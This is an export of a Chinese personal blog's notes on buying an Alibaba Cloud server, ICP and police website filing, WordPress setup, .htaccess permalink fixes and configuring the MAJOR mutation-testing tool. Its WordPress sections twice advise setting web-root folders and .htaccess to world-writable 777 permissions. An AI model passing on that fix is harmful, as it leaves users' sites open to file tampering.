<td>92.28</td>
<td>148.8</td>
<td>统计中...</td>
</tr>
</tbody>
</table>
<p>[^tjfw]: 统计范围：2022 年以来购买与建站相关云产品的账单（阿里云、腾讯云）。</p>
<p>[^fwq]: 我当时购买的阿里云 ECS 实例规格为 1 vCPU 2 GiB（ecs.n4.small），带宽 1Mbps。建议在快到期的时候续费，第三年如果续费的话也是 87.12 元。这个 n4 配置大概已经绝版了。2024 年参与阿里云的活动，购买 3 月 31 日前购买 ecs.e-c1m1.large（2 vCPU 2 GiB 带宽 3Mbps）可以低价续费 3 次，也就能 400 块钱用 4 年。腾讯云 99 那款对标这个产品，但腾讯云只能续费 1 次。</p>
<p>[^ym]: 域名的话第二年 2023 年时收到消息后续升价，我赶紧又多屯一年。</p>
<p>[^txy]: 对象存储和 CDN 服务使用腾讯云产品。</p>
<h1>购买云服务器</h1>
<p>本站部署在阿里云服务器。阿里云服务器的购买指路：</p>
<p><a href="https://www.aliyun.com/product/ecs?spm=5176.19720258.J_8058803260.30.5c642c4aMBUVZE">云服务器 ECS_云主机_服务器托管_弹性计算-阿里云 (aliyun.com)</a></p>
<p>注意：如果要 ICP 备案，ECS 至少买 <strong>3 个月</strong>以上。关于备案可看 <a href="#%E5%9B%9B%E3%80%81icp%E5%A4%87%E6%A1%88">ICP 备案</a>。</p>
<blockquote>
<p>来源于阿里云帮助文档：<a href="https://help.aliyun.com/document_detail/150522.html">使用云市场镜像搭建 WordPress (aliyun.com)</a></p>
<p>如果要备案，您购买的 ECS 实例需包月 3 个月及以上（包含续费），且有公网带宽。</p>
</blockquote>
<p>可以选择的国内云服务商还有：腾讯云、华为云等。</p>
<p>购买服务器后，对 ECS 实例进行初步配置，比如设置密码等：<a href="https://help.aliyun.com/product/25365.html">云服务器 ECS (aliyun.com)</a></p>
<p>若需要安装图形化界面，请参考：</p>
<ul>
<li><a href="https://help.aliyun.com/document_detail/151830.htm?spm=a2c4g.11186623.0.0.47b6337bquJalP">如何在 CentOS 8 系统的 ECS 实例中安装图形界面 (aliyun.com)</a></li>
<li><a href="https://blog.csdn.net/lsbhjshyn/article/details/25652235">yum groupinstall &quot;X Window System&quot; -y 出错，提示 Error Summary 错误解决方法_Logger 的博客-CSDN 博客</a></li>
<li><a href="https://blog.csdn.net/weixin_43945453/article/details/105700809">安装和卸载 CentOS7 图形界面_● 百点热的博客-CSDN 博客_centos7 卸载图形界面</a></li>
</ul>
<h1>搭建博客环境</h1>
<p>我想搭一个 Wordpress 博客网站：<a href="#930915372" title="在 ECS 中搭建 WordPress" class="record-link ">在 ECS 中搭建 WordPress</a></p>
<p>我想搭一个 Hexo 博客网站：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link ">部署 Hexo 个人博客框架到服务器</a></p>
<h1>购买域名</h1>
<p>如果选择在阿里云购买域名，那么首先，需要在阿里云进行身份信息核验。【核验实际用时：当天完成】</p>
<blockquote>
<p>[!hint] 提示<br>
自 2022 年 2 月 15 日起，域名注册将采用先完成域名持有者身份信息核验、再注册域名的方式。即在域名新注时，必须选择已完成实名核验的 域名注册信息模板，否则将无法提交域名注册订单。</p>
<p>来源：<a href="https://help.aliyun.com/noticelist/articleid/1060990693.html?spm=5176.100251.111252.38.421a4f15wxgFAp">阿里云帮助中心-阿里云，领先的云计算服务提供商 (aliyun.com)</a></p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-61-1024x260.png" alt=""></p>
<p>域名注册：<a href="https://wanwang.aliyun.com/domain/?spm=5176.100251.111252.14.421a4f15wxgFAp">域名注册_域名查询_域名申请_域名购买_域名续费_国际域名-万网-阿里云旗下品牌 (aliyun.com)</a></p>
<p>域名注册成功后记得设置域名解析：<a href="https://help.aliyun.com/document_detail/29716.html?spm=a2c4g.11186623.0.0.37fc1f12nXmqC1">新手引导 (aliyun.com)</a></p>
<p>如果需要域名转入等其他操作，请详细查看阿里云的帮助手册。</p>
<h1>ICP 备案</h1>
<blockquote>
<p>目测天津这边的规则相对简单一些，某些省份还有户籍要求以及录视频朗读、手写承诺等要求。</p>
</blockquote>
<p>阿里云可以免费帮你提交备案申请。</p>
<p>备案前准备：下载<strong>阿里云 APP</strong>，准备好身份证。不管是在 PC 端备案还是在 APP 备案，最后还是会回到手机 APP 上，因为需要人脸核验和上传身份证图片。</p>
<p>注意：域名剩余有效期至少大于 <strong>3 个月</strong>，ECS 实例剩余有效期至少大于 <strong>3 个月</strong>。</p>
<p>基本流程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-59.png" alt="|216"></p>
<p>阿里云初审：约 3 个工作日之后，会有阿里云售后客服打电话过来确认信息。确认身份证号、备案网站、应急联系电话等信息。【实际用时：提交备案后 1 个非工作日（在这里点赞阿里云）】</p>
<p>工信部短信核验：工信部会发来验证码，需要在 24 小时内到它的网站上进行核验。【实际用时：打电话过来后的下一天】</p>
<p>管局审核：等待通过的短信。【实际用时：7 天】</p>
<p>备案成功后，悬挂备案号：<a href="https://help.aliyun.com/document_detail/146190.html?spm=a2c4g.11174386.n2.5.1bb94c07c6Tdwj#title-1oz-nkb-91m">ICP 备案后处理 (aliyun.com)</a></p>
<p>懂点 HTML 的自己挂就好，不用花钱请别人挂。。。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220321112508-1024x413.png" alt=""></p>
<p>不要花这个钱</p>
<p>提交备案到成功备案中间经过的时间，阿里云会补偿到服务器中（此处点赞阿里云 again）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-60.png" alt=""></p>
<p>随后将进行公安联网备案。</p>
<h1>公安联网备案</h1>
<p><a href="https://help.aliyun.com/document_detail/43898.html?spm=5176.21213303.J_6704733920.7.662453c9QlATVe&amp;scm=20140722.S_help%40%40%E6%96%87%E6%A1%A3%40%4043898.S_0%2Bos.ID_43898-RL_%E5%85%AC%E5%AE%89-LOC_helpmain-OR_ser-V_2-P0_0">公安联网备案 (aliyun.com)</a></p>
<p>准备好身份证正反面照片、手持身份证件照、域名证书。注意调整文件大小。</p>
<p>进入 <a href="http://www.beian.gov.cn/portal/index.do">全国互联网安全管理服务平台</a>，在<strong>下载中心</strong>找到并下载  《互联网站安全服务平台操作指南》，按照操作指南进行备案。</p>
<p>提交审核后，静候佳音。【实际用时：5 天】</p>
<p>它这里不会发短信或邮件提醒你备案情况，你要自己到网站上查看消息。个人网站的话，即使是交互式网站，也没有人开视频联系你进行核实。点击已备案的网站，查看详情。接下来就要悬挂备案号：</p>
<blockquote>
<p>全国互联网安全管理服务平台</p>
<p>请务必在 30 个工作日之内“复制备案编号 HTML 代码”，粘贴到您网页源代码中的底部位置；“下载备案编号图标”，放在备案编号之前。</p>
</blockquote>
<p>它提供备案编号图标（小小的警徽）和 HTML 代码。悬挂格式如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-7sdf0.png" alt=""></p>
<p>它提供的代码真的很复杂，不如自己写。图片链接要自己加。点击链接会 自动跳到查询页面，并贴心地为你填好备案号。</p>
<p><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011202000621"><img src="https://cdn.gallery.uuanqin.top/img/%E5%A4%87%E6%A1%88%E5%9B%BE%E6%A0%87.png" alt="">津公网安备 12011202000621 号</a></p>
<pre><code class="language-html">&lt;div style=&quot;width:300px;margin:0 auto; padding:20px 0;&quot;&gt;
&lt;a target=&quot;_blank&quot; href=&quot;http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011202000621&quot; style=&quot;display:inline-block;text-decoration:none;height:20px;line-height:20px;&quot;&gt;&lt;img src=&quot;&quot; style=&quot;float:left;&quot;/&gt;&lt;p style=&quot;float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;&quot;&gt;津公网安备 12011202000621号&lt;/p&gt;&lt;/a&gt;
&lt;/div&gt;
</code></pre>
<blockquote>
<p>[!hint] 近期新规<br>
（2024 天津）除了悬挂两个备案号外，还需要增加「违法和不良信息举报」字样（大概意思是这样）并附上站长的联系方式。</p>
</blockquote>
<h1>成功</h1>
<p>OK，一切手续似乎都办妥啦！可以尽情探索建站乐趣了。</p>
<h1>后记</h1>
<p>下面介绍的就是小小站长维护和建设自己网站需要了解的内容。</p>
<h2>站长管理工具</h2>
<ul>
<li>百度：<a href="https://ziyuan.baidu.com/indexs/index?site=http://www.uuanqin.top/">搜索资源平台</a></li>
<li>必应：<a href="https://www.bing.com/webmasters?siteUrl=http%3A%2F%2Fwww.uuanqin.top%2F">WebMaster</a></li>
<li>谷歌：<a href="https://search.google.com/search-console?resource_id=http%3A%2F%2Fwww.uuanqin.top%2F">Google Search Central（前身为“Google 网站站长”）</a></li>
<li>百度统计：<a href="https://tongji.baidu.com/web/10000451814/overview/index?siteId=17892348">百度统计 - 网站概况 (baidu.com)</a></li>
<li>微软的这个 Clarity 挺好玩的：<a href="https://clarity.microsoft.com/projects">Microsoft Clarity - Free Heatmaps &amp; Session Recordings</a></li>
</ul>
<p>注意维护友链、提高网站访问速度也有利于 SEO 排名。</p>
<h2>网站加速</h2>
<blockquote>
<p>温馨提示：请谨慎使用 CDN 产品，以避免攻击导致的高额账单。</p>
</blockquote>
<p>使用 CDN：</p>
<ul>
<li>Wordpress： <a href="https://blog.csdn.net/lieweihan0913/article/details/95631632">【WordPress】 网站打开速度太慢了，两招解决_wordpress 太慢_辉哥笔记的博客-CSDN 博客</a></li>
<li>Hexo：<a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link ">国内访问 Hexo 优化加速（CDN链接替换）</a></li>
</ul>
<h2>SSL 证书的获取与安装</h2>
<p>参看我的另一篇文章：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link ">Linux 服务器 HTTPS 的配置</a></p>
<p>精华文章：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link ">博客域名解析管理与网站 CDN 加速域名配置</a></p>
<h2>PHP 的更新</h2>
<p><a href="https://www.cnblogs.com/cinlap/p/12801076.html">CentOS8 下安装、卸载、切换 PHP 版本 - Cinlap Soft - 博客园 (cnblogs.com)</a></p>
<h2>网站内容安全</h2>
<p>中间页的实现：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">6</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="181570378">
                            <a href="#181570378">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>部署 Hexo 个人博客框架到服务器</span>
                                
                                <div class="record-links-context hover">
                                    <p>我想搭一个 Hexo 博客网站：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link highlight">部署 Hexo 个人博客框架到服务器</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="930915372">
                            <a href="#930915372">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_wordpress);">⬤</span>
                                    
                                </span>
                                
                                <span>在 ECS 中搭建 WordPress</span>
                                
                                <div class="record-links-context hover">
                                    <p>我想搭一个 Wordpress 博客网站：<a href="#930915372" title="在 ECS 中搭建 WordPress" class="record-link highlight">在 ECS 中搭建 WordPress</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>参看我的另一篇文章：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2065118013">
                            <a href="#2065118013">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>国内访问 Hexo 优化加速（CDN链接替换）</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>Wordpress： <a href="https://blog.csdn.net/lieweihan0913/article/details/95631632">【WordPress】 网站打开速度太慢了，两招解决_wordpress 太慢_辉哥笔记的博客-CSDN 博客</a></li>
<li>Hexo：<a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link highlight">国内访问 Hexo 优化加速（CDN链接替换）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2201181434">
                            <a href="#2201181434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                </span>
                                
                                <span>博客域名解析管理与网站 CDN 加速域名配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>精华文章：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3790495434">
                            <a href="#3790495434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客与 Waline 评论区实现外链跳转中间页</span>
                                
                                <div class="record-links-context hover">
                                    <p>中间页的实现：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="930915372" class="record">
            <header>
                <h1 class="record-title">在 ECS 中搭建 WordPress</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ECS');">ECS</button>
                    
                    <button class="btn" onclick="activeTag('阿里云');">阿里云</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/21/2022</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>简要介绍ECS中Wordpress的搭建</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>377ca42c</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>环境搭建</h1>
<blockquote>
<p>你已经有了一台ECS，那么如何搭建Wordpress博客网站？</p>
</blockquote>
<p>本站通过手工安装的方式搭建开源组合LAMP环境：<a href="https://help.aliyun.com/document_detail/50774.html">部署LAMP环境（CentOS 7） (aliyun.com)</a> 其实也可以按照阿里云的教程使用WordPress镜像进行建站。</p>
<p>Wordpress的安装部署：<a href="https://help.aliyun.com/document_detail/151691.html">手动搭建WordPress（CentOS 7） (aliyun.com)</a> 包含设置域名、域名解析等步骤。</p>
<p>如果ICP未备案完成，WordPress中的设置中的站点地址和Wordpress地址为服务器的公网ip。ICP备案成功后再同时改过来。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-58-1024x231.png" alt=""></p>
<p>以下这种打开WordPress自定义时出现的错误就是WordPress地址和站点地址不一样导致的：<a href="https://developer.aliyun.com/ask/102267?spm=a2c6h.13159736">wordpress无法动态预览更改 显示Non-existent changeset UUID.-问答-阿里云开发者社区-阿里云 (aliyun.com)</a></p>
<h1>其他内容</h1>
<h2>SEO</h2>
<p>在wordpress，可以安装一款SEO插件，由它可指导关键词的安排与文章写作。然后向各搜索引擎提交网站的收录。</p>
<p><a href="https://blog.csdn.net/u013365886/article/details/80403100">如何让百度快速收录WordPress网站？_小柯2319184669的博客-CSDN博客</a></p>
<p><a href="https://yoast.com/what-is-an-xml-sitemap-and-why-should-you-have-one/#utm_source=yoast-seo&amp;utm_medium=software&amp;utm_term=features-xml-sitemap&amp;utm_content=dashboard&amp;utm_campaign=wordpress-general&amp;php_version=7.4&amp;platform=wordpress&amp;platform_version=5.9.1&amp;software=free&amp;software_version=18.4.1&amp;days_active=6-30&amp;screen=wpseo_dashboard">What is an XML sitemap and why should you have one? • Yoast</a></p>
<h2>Wordpress自动更新失效</h2>
<p>一个排查方向：登录后台&gt;工具&gt;站点健康，会有wordpress不能正常更新的说明。我的原因主要是wordpress没有权限写入文件夹内容。<code>chmod -R 777 &lt;文件夹&gt;</code>就好了。</p>
<h2>腾讯云COS工具</h2>
<p>大坑！使用腾讯云COS工具将附件上传到COS后（一般包括你的主体样式），找不到方法逆转。这意味着你删掉COS中的文件后，即使服务器保留有，也不懂有什么办法逆转。（暂时找不到办法）</p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <p>我想搭一个 Wordpress 博客网站：<a href="#930915372" title="在 ECS 中搭建 WordPress" class="record-link highlight">在 ECS 中搭建 WordPress</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2555088146" class="record">
            <header>
                <h1 class="record-title">关于 wordPress 固定链接的修改以及 htaccess 文件不起作用问题的解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Apache');">Apache</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/23/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>自己新建一个，注意设置好权限。如果失效，需要修改httpd的配置。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>984b8d12</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 注意<br>
修改固定链接可能会影响网站的 SEO 排名。请准备好解决方案并谨慎修改！</p>
</blockquote>
<p>因为安装了一个 WordPress 缓存插件，需要更改 WordPress 的固定链接。但是，WordPress 固定链接的更改出现了以下问题：</p>
<h1>无法写入.htaccess 文件</h1>
<p>这是由于权限设置所导致的。打开服务器，进入到 wordpress 的根目录，粘贴 wordpress 提供的内容到 .htaccess 文件。注意，开头带点的文件为隐藏文件，在 linux 下使用 ls 时注意加上选项 -a 以查看隐藏文件：</p>
<pre><code class="language-shell">ls -a
</code></pre>
<p>要查看隐藏文件的权限可以再加上-l 选项：</p>
<pre><code class="language-sh">ls -al
</code></pre>
<p>把.htaccess 的权限设置为 777：</p>
<pre><code class="language-sh">chmod -v 777 .htaccess
</code></pre>
<h1>没有.htaccess 文件</h1>
<p>如果没有 .htaccess 文件，可以自己新建一个（建在 wordpress 根目录下）。把 .htaccess 的权限设置为 777。这样 WordPress 就可以更改你的 .htaccess 文件了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/conf%E5%86%85%E5%AE%B9%E5%A4%A7%E8%87%B4%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84-1024x543.png" alt=""></p>
<p>.htaccess 文件应该像这样</p>
<h1>.htaccess 文件不起作用</h1>
<p>即使 .htaccess 文件更改好了，检查之后也没有问题，但 .htaccess 就是不起作用。这时需要更改 httpd.conf。</p>
<p>找到 httpd.conf 位置：</p>
<pre><code class="language-bash">find / -name httpd.conf
</code></pre>
<p>vim 进行编辑，搜索 AllowOverride 参数。找到 https 站点的 Directory 设置 AllowOverride <strong>All</strong>。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220323225800-1024x637.png" alt=""></p>
<p>重启 httpd：</p>
<pre><code class="language-bash">service httpd restart
</code></pre>
<p>重新再 wordpress 固定链接设置里再保存一遍即可。</p>
<h1>参考链接</h1>
<ul>
<li><a href="https://www.wpbeginner.com/beginners-guide/why-you-cant-find-htaccess-file-on-your-wordpress-site/#:~:text=WordPress%20automatically%20generates.htaccess%20file%20because%20it%20is%20required,now%20try%20to%20generate%20the.htaccess%20file%20for%20you.">Why You Can't Find .htaccess File on Your WordPress Site (wpbeginner.com)</a></li>
<li><a href="https://blog.csdn.net/laoqiming/article/details/84311744">.htaccess 设置不起作用_劳启的博客-CSDN 博客_htaccess 不起作用</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1018322944" class="record">
            <header>
                <h1 class="record-title">MAJOR的配置与基本使用</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('MAJOR');">MAJOR</button>
                    
                    <button class="btn" onclick="activeTag('WSL');">WSL</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/24/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>需要在Linux环境下才不会出现错误。请仔细研读MAJOR官方的PDF。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/MAJOR.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>3cb26000</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>MAJOR今天捣鼓了很久，呕心沥血才弄出来。。。没力气详述了。<strong>如果对major里的命令和文件有疑惑，请详详细细看MAJOR的PDF进行学习！</strong></p>
<p>在开始之前，首先获取MAJOR的指导文件：<a href="http://mutation-testing.org/doc/major.pdf">http://mutation-testing.org/doc/major.pdf</a>，详细阅读后如有问题可看接下来的简单操作使用。</p>
<h1>环境与配置</h1>
<p>下载好压缩包后，解压到你想安装的地方即可，比如<strong>D:/major</strong>下。文件结构如图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-62.png" alt=""></p>
<p>配置好系统的环境变量：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-63-1024x447.png" alt=""></p>
<p>注意哦，确保在新配的这个路径里，有javac、ant等这些程序哦</p>
<p>输入命令：</p>
<pre><code class="language-shell">javac -version
</code></pre>
<p>这里不是说你在Windows命令行输入命令返回出内容就可以了。</p>
<p>比如返回：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-644.png" alt=""></p>
<p>这里返回的不是MAJOR里的javac程序。由于未知原因，即使配置好了环境变量，但是Windows下无法执行D:\major\bin下的javac（它总是弹出打开方式的选择框）。这里我换成了LINUX环境。</p>
<p><strong>【以下操作均在WSL配合下进行。Ubuntu-20.04】</strong>（当然使用虚拟机是可以的。附：<a href="https://www.cnblogs.com/lepeCoder/p/wsl_dir.html">windows10 ubuntu子系统 WSL文件位置</a>）</p>
<p>[wpdiscuz-feedback id=&quot;ssas9ftfam&quot; question=&quot;有疑惑？请对此提供反馈&quot; opened=&quot;0&quot;][/wpdiscuz-feedback]</p>
<p>首先在Linux下准备好Java环境。下图展示无Java环境情形：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220324170844.png" alt=""></p>
<p>附安装过程中出现<strong>E: Unable to locate package openjdk-8-jre</strong> 失败的解决（下图）:<br>
<a href="https://blog.csdn.net/u012956987/article/details/107448548">E: Unable to locate package openjdk-8-jre ubuntu 20.04安装jdk 失败_学无止境qwer的博客-CSDN博客</a><br>
<a href="https://blog.csdn.net/appleyuchi/article/details/105103293">Errors were encountered while processing 解决方法_微电子学与固体电子学-俞驰的博客-CSDN博客</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220324170858.png" alt=""></p>
<p>Java安装失败示例</p>
<p>安装成功检查：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220324170821.png" alt=""></p>
<p>这时候再检查javac：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220324170809.png" alt=""></p>
<p>这才和官方的pdf中显示得差不多，才算成功。</p>
<p>**新增：**再做以下检查</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-71-1024x104.png" alt=""></p>
<p><strong>注意：<strong>如果在过程中，中途有修正过环境变量，请</strong>新建一个终端</strong>或<strong>退出终端后重新进来</strong>再试一试！如果还不行，请<strong>卸载Linux里的Java再重新安装</strong>！亲测有效。</p>
<h1>复制</h1>
<p>MAJOR文件夹里边example是两个例子，我们需要把例子里边的一些东西复制到我们待测试的Java项目中来。你的Java项目应该是这个样子：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-6555.png" alt=""></p>
<p>把all.mml（在mml文件夹下）、build.xml（在example/ant下）搬过来。</p>
<p>执行：(感谢日日快乐童鞋指正)</p>
<pre><code class="language-bash">$ mmlc all.mml all.mml.bin
</code></pre>
<p>生成了一个all.mml.bin文件。build.xml需要进行修改。</p>
<p>（例子中的这个all.mml指的是生成所有种类的变异算子。如果MML自己写的话，通过mmlc可以自己生成这个.bin文件。）</p>
<p>注意，测试类不要使用参数化编程。会有未知错误。</p>
<p>[wpdiscuz-feedback id=&quot;ssas9ftfam&quot; question=&quot;有疑惑？请对此提供反馈&quot; opened=&quot;0&quot;][/wpdiscuz-feedback]</p>
<p>下面是跟据我的项目目录结构，按需修改build.xml。（考验你洞察力的时候到了！！😲）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-66666.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-6567.png" alt=""></p>
<p>更正图片文字：“根据你的测试文件位置按需修改”</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-ssa68.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-asd72.png" alt=""></p>
<h1>使用</h1>
<p>还记得MAJOR那两个例子吗。在D:/major/example/ant文件夹下，有一个run.sh的例子。以它作为参考，我们做这些执行：</p>
<pre><code class="language-shell">$ ant -DmutOp=&quot;=all.mml.bin&quot; clean compile
$ ant compile.tests
$ ant mutation.test
</code></pre>
<p>注意：执行命令的位置和build.xml是同一个目录。</p>
<p>最后的结果大图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-69-1024x794.png" alt=""></p>
<h1>其他问题</h1>
<p>有童鞋出现了以下问题，对部分问题提供了解决思路。供参考：</p>
<ul>
<li>ant -version 查到的不是major自带的那个。解决方法，删掉Linux里的那个ant。</li>
<li>在复制Windows的major到WSL里，没在Linux里配环境变量的话，javac、ant总有一个在命令行找不到。只有在Windows里边原有的项目，打开Linux环境，按照与我一样的做法才行。</li>
<li>如果一个变异体都杀不死/没覆盖，请尝试检查mutants.log是否有变异体生成，然后再检查build.xml有没有改好。</li>
</ul>
<h1>更多参考</h1>
<p>关于Ant里的Junit各种属性手册：<a href="https://ant.apache.org/manual/Tasks/junit.html">JUnit Task (apache.org)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3771188998" class="record">
            <header>
                <h1 class="record-title">旧页面-赞赏＆贡献</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/26/2022</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>e0c7c706</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/achived-cover.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Warning] 这是一篇归档文章<br>
本页面已停止更新，仅起历史归档作用。</p>
</blockquote>
<p>感谢你能来到这个页面！小站建设不易，需要你的帮助！小钱钱将全部用于<strong>建设本网站、强健身体</strong>以提供更优质的内容！</p>
<p><img src="https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/wxzs.png" alt=""></p>
<p><img src="https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/zfbzs.jpg" alt=""></p>
<p>金主 BaBa 将会被登榜感谢 😙😙😙！</p>
<p>如果你想为网站贡献更多的优质内容，并<strong>成为网站作者</strong>，请通过 <strong>QQ、微信、邮箱</strong>联系我！（联系方式见网站页面底部右侧）</p>
<p>祝你生活愉快！</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="648224007" class="record">
            <header>
                <h1 class="record-title">博客网站网页变灰的操作方法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
